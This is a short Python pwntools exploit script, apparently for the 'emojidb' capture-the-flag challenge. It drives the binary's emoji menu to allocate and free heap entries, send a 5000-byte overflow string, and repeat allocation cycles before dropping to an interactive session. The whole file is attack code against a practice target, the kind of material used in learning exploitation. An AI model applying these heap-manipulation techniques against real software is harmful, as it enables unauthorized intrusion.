from pwn import *

def etb(hexno):         # emoji hexcode to 4byte byte-array
    return ("\\U%08x" % hexno).decode('unicode-escape').encode('utf-8')

def bte(bstr):          # unicode to hex
    return hex(ord(bstr))

DEBUG = True
if DEBUG:
    p = process("./emojidb_noalarm")
else:
    p = remote("emojidb.pwni.ng", 9876)
context.log_level = "debug"
new = 0x1f195
delete = 0x1f193
view = 0x1f4d6
qmark = 0x2753
one = '\x31\xef\xb8\x8f\xe2\x83\xa3'

p.sendafter(etb(qmark), etb(new))
p.sendlineafter(etb(qmark), "256")
p.sendafter(etb(qmark), etb(new))
p.sendlineafter(etb(qmark), "256")
p.sendafter(etb(qmark), etb(new))
p.sendlineafter(etb(qmark), "256")
p.sendafter(etb(qmark), etb(new))
p.sendlineafter(etb(qmark), "256")
p.sendafter(etb(qmark), etb(new))
p.sendlineafter(etb(qmark), "256")

p.sendafter(etb(qmark), etb(delete))
p.sendlineafter(etb(qmark), "1")

payload = "A" * 5000
p.sendlineafter(etb(qmark), payload)
for i in range(5000):
    p.recvline()

for i in range(1024):
    p.sendlineafter(etb(qmark), "hehehehehihihihi")
    p.recvuntil("hehehehehihihihi")
    p.sendafter(etb(qmark), etb(new))
    p.sendlineafter(etb(qmark), "8")
    p.sendafter(etb(qmark), etb(delete))
    p.sendlineafter(etb(qmark), "1")

p.interactive()
